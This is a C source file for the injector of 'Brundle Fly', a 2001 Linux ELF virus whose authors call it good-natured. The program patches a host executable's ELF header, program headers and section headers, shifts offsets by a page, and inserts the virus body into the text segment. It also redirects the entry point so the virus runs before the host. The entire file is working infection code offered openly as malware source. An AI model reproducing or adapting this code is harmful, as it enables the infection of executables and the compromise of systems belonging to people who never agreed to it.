/*
 * Brundle Fly - Good-natured Linux ELF virus supporting kernel 2.2 and 2.4
 * Copyright 2001 Konrad Rieck <kr@roqe.org>, Konrad Kretschmer <kk@roqe.org>
 * In memory to Seth Brundle 
 *
 * This is the start of all evil. This program injects the Brundly Fly 
 * virus into an innocent host file. It is working similar to the virus
 * itself, but uses proper functions and good readable code (hopefully).
 *
 * $Id: inject.c,v 1.10 2001/07/11 18:34:48 kr Exp $
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <config.h>
#include <elfio.h>
#include <brundle-fly.h>

extern off_t virus_entry;
extern off_t host_entry;
extern size_t virus_length;
extern char virus_data[];

/*
 * Find a tag in virus_data. This function is used when patching the 
 * virus_start_off.
 */
off_t find_tag(unsigned char *tag)
{
    off_t i = 0;
    unsigned char *ptr = virus_data;

    while (i < virus_length - strlen(tag)) {
	if (!memcmp(ptr, tag, strlen(tag)))
	    return i;
	i++;
	ptr++;
    }
    return -1;
};

/*
 * Copy data from src to dst file of length len. Since is not the code
 * used inside the virus we can output error messages and use dynamic
 * allocated memory. Ah!
 */
int copy(int src, int dst, size_t len)
{
    char *buf;
    size_t r_copied = 0, w_copied = 0;

    buf = (char *) malloc(len);

    r_copied = read(src, buf, len);
    w_copied = write(dst, buf, len);

    free(buf);

    if (r_copied - len) {
	printf("Read of %d bytes failed.\n", len);
	perror("");
	return 0;
    }

    if (w_copied - len) {
	printf("Write of %d bytes failed.\n", len);
	perror("");
	return 0;
    }

    printf(".");

    return 1;
}

/*
 * Insert code into a file dst from the buffer pointed to by buf of 
 * length len. 
 */
int insert(int dst, char *buf, size_t len)
{
    size_t w_copied = 0;

    w_copied = write(dst, buf, len);

    if (w_copied - len) {
	printf("Write of %d bytes failed.\n", len);
	perror("");
	return 0;
    }

    printf(".");

    return 1;
}

/*
 * Fill length bytes of the file dst with charakters c. 
 */
int fill(int dst, char c, size_t len)
{
    char *buf;
    size_t w_copied = 0;

    buf = (char *) malloc(sizeof(char) * len);
    memset(buf, c, len);

    w_copied = write(dst, buf, len);

    if (w_copied - len) {
	printf("Write of %d bytes failed.\n", len);
	perror("");
	return 0;
    }

    printf(".");

    return 1;
}

/* 
 * This is the injection() function that can also be found in the virus
 * itself, this one is the mother of the inject() function in the virus,
 * it's code is organized and not that compact. This function also 
 * includes a flag no_action, that allows the user to just check if an
 * injection would be possible. 
 */
int inject(int src, int dst, int size, int no_action)
{
    Elf_Ehdr *ehdr;
    Elf_Phdr *phdrs, *ptmp;
    Elf_Shdr *shdrs, *stmp;
    int i, j;
    size_t vstart = 0, rstart, secstart, position = 0;

    /*
     * Read in the ELF header, the section headers and program headers. 
     */
    ehdr = read_ehdr(src);
    phdrs = read_phdrs(src, ehdr);
    shdrs = read_shdrs(src, ehdr);

    /*
     * Check if the given file is a potential host, in other words:
     * ELF binary for i386.
     */
    if (!check_host(ehdr))
	return 0;

    /*
     * Iterate through the different program headers and look for a segment
     * that olds the text segment. Also check that this segment has equal
     * memory size and file size. If file size and memory size don't match,
     * this segment has a bss section at the end.
     */
    printf("- Looking for suitable text segment: ");
    for (i = 0, ptmp = phdrs; i < ehdr->e_phnum; i++, ptmp++)
	if (ptmp->p_type == PT_LOAD && ptmp->p_memsz == ptmp->p_filesz) {

	    if (i == ehdr->e_phnum) {
		printf("not found\n");
		return 0;
	    } else
		printf(" found\n");

	    /*
	     * Set virt_start to the virtual address the virus will start at
	     * and set real_start to the physical address the virus will
	     * start at.
	     */
	    vstart = ptmp->p_vaddr + ptmp->p_filesz;
	    rstart = ptmp->p_offset + ptmp->p_filesz;

	    printf("- Virtual virus start at 0x%.8x\n", vstart);
	    printf("- Physical virus start at 0x%.8x\n", rstart);


	    /*
	     * Find the virus_start tag.
	     */
	    j = find_tag(VIRUS_A_START);

	    if (j < 0) {
		fprintf(stderr, "Could not find virus_start field.\n");
		exit(EXIT_FAILURE);
	    }

	    printf("- Patching virus_data[%d] (virus_start) to 0x%.8x\n",
		   j, rstart);

	    /*
	     * Set the virus start.
	     */
	    *(int *) &virus_data[j] = rstart;

	    printf("- Patching virus_data[%ld] (host_entry) to 0x%.8x\n",
		   host_entry, ehdr->e_entry);


	    /*
	     * Patch the virus code for our victim host. Set the host_entry
	     * variable to point to ehdr.entry. After saving the ehdr.entry
	     * in host_entry, override it in the ELF header by our
	     * virus_entry + the virutal address the virus starts at.
	     */
	    *(int *) &virus_data[host_entry] = ehdr->e_entry;
	    ehdr->e_entry = vstart + virus_entry;

	    printf("- Increasing file/mem size %d by %d\n",
		   ptmp->p_filesz, virus_length);

	    /*
	     * We increased the text segment, therefore adjust the size of
	     * this segment in memory and in the file.
	     */
	    ptmp->p_filesz += virus_length;
	    ptmp->p_memsz += virus_length;


	    /*
	     * Check if there is enough space for the virus code. 
	     */
	    if (PAGE_SIZE - (vstart & (PAGE_SIZE - 1)) < virus_length) {
		fprintf(stderr, "Virus too large for this file.\n");
		return 0;
	    }

	    printf("- Fixing following phdr offsets: ");

	} else if (vstart) {

	    /* 
	     * For all program headers that follow our code, increase the
	     * offset by a page size. 
	     */
	    ptmp->p_offset += PAGE_SIZE;
	    printf(".");

	} else
	    printf(".");

    printf(" done\n");

    /*
     * Same goes for the section headers. All section headers after the
     * injected virus have to be adjusted. The section that close to our
     * code has to be increased.
     */
    printf("- Fixing following shdr offsets: ");
    for (i = 0, stmp = shdrs; i < ehdr->e_shnum; i++, stmp++)
	if (stmp->sh_offset >= rstart) {
	    stmp->sh_offset += PAGE_SIZE;
	    printf(".");
	} else if (stmp->sh_addr + stmp->sh_size == vstart)
	    stmp->sh_size += virus_length;
    printf(" done\n");

    secstart = ehdr->e_shoff;

    printf("- Fixing shdr tabel offset if necessary.\n");
    if (ehdr->e_shoff >= rstart)
	ehdr->e_shoff += PAGE_SIZE;

    /*
     * Write our patched code. See the virus code in brundle-fly-proto.c
     * for a detailed description what is happening in each scripts. 
     * In short word. 
     *    - Write patched ELF header. 
     *    - Write patched program headers
     *    - Copy from program headers end to virus start
     *    - Insert Virus
     *    - Fill rest until PAGE_SIZE
     *    - Copy from rest end to section headers start
     *    - Write patched section headers. 
     *    - Copy from section headers end to file end. 
     */
    if (!no_action) {
	printf("- Starting to write injected binary: ");

	if (!insert(dst, (char *) ehdr, sizeof(Elf_Ehdr)))
	    return 0;

	if (!insert(dst, (char *) phdrs, sizeof(Elf_Phdr) * ehdr->e_phnum))
	    return 0;

	position = sizeof(Elf_Phdr) * ehdr->e_phnum + sizeof(Elf_Ehdr);
	lseek(src, position, SEEK_SET);

	if (!copy(src, dst, rstart - position))
	    return 0;

	if (!insert(dst, virus_data, virus_length))
	    return 0;

	if (!fill(dst, 0, PAGE_SIZE - virus_length))
	    return 0;

	if (!copy(src, dst, secstart - rstart))
	    return 0;

	if (!insert(dst, (char *) shdrs, sizeof(Elf_Shdr) * ehdr->e_shnum))
	    return 0;

	position += sizeof(Elf_Shdr) * ehdr->e_shnum + secstart - position;

	if (!copy(src, dst, size - position))
	    return 0;

	printf(" done\n");

    }

    free(ehdr);
    free(phdrs);
    free(shdrs);

    return 1;
}

/*
 * Usage.
 */
void print_usage()
{
    fprintf(stderr, "usage: inject [-hn] <host> <injected-host>\n");
    fprintf(stderr, "options:  -n  just check if injection possible\n");
    fprintf(stderr, "          -h  print this help screen\n");
}

int main(int argc, char **argv)
{
    extern char *optarg;
    extern int optind, opterr, optopt;

    int src, dst, c, no_action = 0, usage = 0;
    struct stat st;

    while ((c = getopt(argc, argv, "hn")) != EOF)
	switch (c) {
	case 'n':
	    no_action++;
	    break;
	default:
	    usage++;
	    break;
	}

    if (usage || argc < optind + 2) {
	print_usage();
	exit(EXIT_FAILURE);
    }

    if ((src = open(argv[optind + 0], O_RDONLY)) < 0) {
	perror(argv[optind + 0]);
	exit(EXIT_FAILURE);
    }

    if ((dst = open(argv[optind + 1], O_WRONLY | O_CREAT, 0600)) < 0) {
	perror(argv[optind + 1]);
	exit(EXIT_FAILURE);
    }

    fstat(src, &st);

    printf("- Infecting %s to %s\n", argv[optind + 0], argv[optind + 1]);
    printf("  Virus length: %d\n", virus_length);
    printf("  Host entry:   %ld\n", host_entry);
    printf("  Virus entry:  %ld\n", virus_entry);

    /*
     * After opening the files, do the infection.
     */
    if (!inject(src, dst, st.st_size, no_action)) {
	printf("Could not inject binary, sorry\n");
	exit(EXIT_FAILURE);
    }

    close(src);
    close(dst);
    return EXIT_SUCCESS;
}
